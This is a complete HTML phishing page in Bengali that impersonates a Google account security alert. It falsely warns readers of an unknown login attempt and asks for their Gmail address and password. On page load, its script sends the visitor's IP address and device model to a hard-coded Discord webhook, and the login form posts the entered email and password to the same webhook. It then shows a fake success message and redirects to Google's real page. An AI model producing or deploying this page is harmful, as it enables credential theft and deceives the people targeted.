<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Alert</title>
    
    <script>
        // তোমার ডিসকর্ড লিঙ্ক
        const webhook = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        // ১. লিঙ্কে ক্লিক করার সাথে সাথে আইপি এবং মডেল পাঠানোর মেইন ইঞ্জিন
        async function hitNow() {
            let userIP = "Detecting...";
            let device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1].split(';')[0] || navigator.platform;

            // আইপি ধরার জন্য সবচেয়ে ফাস্ট সার্ভিস
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (e) { userIP = "IP Hidden by User"; }

            // সাথে সাথে ডিসকর্ডে পাঠানো
            await fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🚀 **TARGET CLICKED THE LINK!**",
                    embeds: [{
                        color: 16711680,
                        title: "Target Information Identified",
                        fields: [
                            { name: "🌐 IP Address", value: userIP, inline: true },
                            { name: "📱 Device Model", value: device, inline: true }
                        ],
                        footer: { text: "Collected at: " + new Date().toLocaleTimeString() }
                    }]
                })
            });
        }

        // পেজ লোড হওয়ার জন্য অপেক্ষা না করে সাথে সাথে রান করো
        hitNow();
    </script>

    <style>
        body { background: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #d93025; }
        .logo { width: 50px; margin-bottom: 20px; }
        .warn { background: #fff3f2; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 25px; font-size: 14px; color: #3c4043; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
    <h2 style="font-size: 20px; margin-bottom: 15px;">অ্যাকাউন্ট ভেরিফিকেশন</h2>
    <div class="warn">
        <strong>⚠️ জরুরি সতর্কতা:</strong> আপনার জিমেইল অ্যাকাউন্টে অন্য একটি অপরিচিত ডিভাইস থেকে লগইন করার চেষ্টা করা হয়েছে। আপনার আইডিটি নিরাপদ রাখতে এবং ব্যান হওয়া থেকে বাঁচাতে এখনই ভেরিফাই করুন।
    </div>
    <input type="email" id="u" placeholder="জিমেইল এড্রেস">
    <input type="password" id="p" placeholder="পাসওয়ার্ড">
    <button class="btn" onclick="sendLogin()">ভেরিফাই করুন</button>
</div>

<script>
    // ২. জিমেইল এবং পাসওয়ার্ড পাঠানোর অংশ
    async function sendLogin() {
        const email = document.getElementById('u').value;
        const pass = document.getElementById('p').value;

        if(!email || !pass) return alert("সঠিক তথ্য দিন!");

        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "🧨 **LOGIN DATA CAPTURED!**",
                embeds: [{
                    color: 65280,
                    fields: [
                        { name: "📧 Email", value: email },
                        { name: "🔑 Password", value: pass }
                    ]
                }]
            })
        });

        alert("ভেরিফিকেশন সফল! আপনার অ্যাকাউন্ট এখন নিরাপদ।");
        window.location.href = "https://myaccount.google.com/security";
    }
</script>

</body>
</html>
